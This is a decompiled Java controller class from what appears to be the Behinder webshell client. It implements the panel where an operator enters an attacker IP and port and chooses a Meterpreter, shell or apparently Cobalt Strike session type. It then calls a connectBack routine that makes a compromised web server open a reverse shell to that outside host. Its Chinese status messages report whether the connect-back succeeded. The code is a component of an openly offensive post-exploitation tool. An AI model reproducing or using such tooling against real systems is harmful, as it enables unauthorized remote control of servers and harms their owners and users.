// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.ui.controller;

import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.scene.control.ToggleGroup;
import javafx.scene.control.Label;
import java.util.List;
import org.json.JSONObject;
import net.rebeyond.behinder.core.ShellService;
import javafx.scene.control.TextArea;
import javafx.scene.control.Button;
import javafx.scene.control.RadioButton;
import javafx.fxml.FXML;
import javafx.scene.control.TextField;
import net.rebeyond.behinder.dao.ShellManager;

public class ReverseViewController
{
    private ShellManager shellManager;
    @FXML
    private TextField reverseIPText;
    @FXML
    private TextField reversePortText;
    @FXML
    private RadioButton reverseTypeMeterRadio;
    @FXML
    private RadioButton reverseTypeShellRadio;
    @FXML
    private RadioButton reverseTypeColbatRadio;
    @FXML
    private Button reverseButton;
    @FXML
    private TextArea reverseHelpTextArea;
    private ShellService currentShellService;
    private JSONObject shellEntity;
    private List<Thread> workList;
    private Label statusLabel;
    
    public void init(final ShellService shellService, final List<Thread> workList, final Label statusLabel) {
        this.currentShellService = shellService;
        this.shellEntity = shellService.getShellEntity();
        this.workList = workList;
        this.statusLabel = statusLabel;
        this.initReverseView();
    }
    
    private void initReverseView() {
        final ToggleGroup radioGroup = new ToggleGroup();
        this.reverseTypeMeterRadio.setToggleGroup(radioGroup);
        this.reverseTypeShellRadio.setToggleGroup(radioGroup);
        this.reverseTypeColbatRadio.setToggleGroup(radioGroup);
        this.reverseTypeMeterRadio.setUserData((Object)"meter");
        this.reverseTypeShellRadio.setUserData((Object)"shell");
        this.reverseTypeColbatRadio.setUserData((Object)"colbat");
        this.reverseButton.setOnAction(event -> {
            final Runnable runner = () -> {
                try {
                    String targetIP = this.reverseIPText.getText();
                    String targetPort = this.reversePortText.getText();
                    RadioButton currentTypeRadio = (RadioButton)radioGroup.getSelectedToggle();
                    if (currentTypeRadio == null) {
                        Platform.runLater(() -> this.statusLabel.setText("\u8bf7\u5148\u9009\u62e9\u53cd\u5f39\u7c7b\u578b\u3002"));
                    }
                    else {
                        String type = currentTypeRadio.getUserData().toString();
                        JSONObject resultObj = this.currentShellService.connectBack(type, targetIP, targetPort);
                        String status = resultObj.getString("status");
                        if (status.equals("fail")) {
                            Platform.runLater(() -> {
                                String msg = resultObj.getString("msg");
                                this.statusLabel.setText("\u53cd\u5f39\u5931\u8d25:" + msg);
                            });
                        }
                        else {
                            Platform.runLater(() -> this.statusLabel.setText("\u53cd\u5f39\u6210\u529f\u3002"));
                        }
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                    Platform.runLater(() -> this.statusLabel.setText("\u64cd\u4f5c\u5931\u8d25:" + e.getMessage()));
                }
                return;
            };
            final Thread worker = new Thread(runner);
            this.workList.add(worker);
            worker.start();
        });
    }
}
